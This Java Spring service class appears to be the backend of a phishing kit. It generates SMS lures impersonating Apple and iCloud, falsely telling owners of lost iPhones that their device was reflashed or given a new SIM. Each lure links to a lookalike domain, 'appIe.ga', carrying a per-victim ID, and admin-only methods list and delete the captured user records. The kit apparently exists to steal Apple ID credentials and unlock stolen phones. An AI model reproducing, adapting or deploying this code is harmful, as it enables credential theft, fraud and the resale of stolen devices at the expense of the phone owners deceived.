package com.apple.services;

import com.apple.domain.Manager;
import com.apple.domain.ManagerProperties;
import com.apple.domain.Message;
import com.apple.domain.Users;
import com.apple.repository.MessageRepository;
import com.apple.repository.UsersRepository;

import java.util.List;
import java.util.UUID;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

/**
 * ManagerService
 */
@Service
public class ManagerService {

    private Logger logger = LoggerFactory.getLogger(ManagerService.class);

    @Autowired
    private ManagerProperties managerProperties;

    @Autowired
    private MessageRepository messageRepository;

    @Autowired
    private UsersRepository usersRepository;

    public boolean checkStatu(Manager manager) {
        if (manager.isReal()) {
            if (this.managerProperties.getUsername().equals(manager.getUsername())) {
                if (this.managerProperties.getPassword().equals(manager.getPassword())) {
                    logger.info("管理员账号密码正确");
                    return true;
                }
            }
        }
        return false;
    }

    public Message createMessage(String phone) {
        if (null != phone) {
            if (!"".equals(phone)) {
                Message message = messageRepository.findByPhone(phone);
                if(null!=message){
                    return message;
                }
                String uuid = UUID.randomUUID().toString().replace("-", "");
                message = new Message();
                message.setPhone(phone);
                message.setUuid(uuid);
                message.setMessage(
                        "尊敬的Apple用户您好：您遗失的iPhone设备已进入DFU刷机模式激活，如非本人进行此类操作请登录管理中心 www.appIe.ga/AppleID/login/" + uuid
                                + " 并查看此设备所在位置。【Apple通知】");
                message.setMessage2("【iCloud提醒】                您的iPhone已联网，插入SIM卡,被用于Wed浏览器上申请POD模式解除设备锁。如非本人进行此类操作；请登录( www.appIe.ga/AppleID/login/"+uuid+" ) 并查看SIM卡号和位置。");
                try{
                    messageRepository.save(message);
                    return message;
                }catch (Exception e){
                    e.printStackTrace();
                    throw e;
                }
            }
        }
        return null;

    }

    public List<Users> findAllUsers(Manager manager){
        if (null!=manager){
            if(managerProperties.getUsername().equals(manager.getUsername())){
                if (managerProperties.getPassword().equals(manager.getPassword())){
                    return usersRepository.findAll();
                }
            }
        }
        return null;
    }

    public boolean deleteUsers(Manager manager,Integer id){
        if (null!=manager){
            if(managerProperties.getUsername().equals(manager.getUsername())){
                if (managerProperties.getPassword().equals(manager.getPassword())){
                    try{
                        usersRepository.delete(id);
                        return true;
                    }catch(Exception e){
                        e.printStackTrace();
                        throw e;
                    }
                }
            }
        }
        return false;
    }

}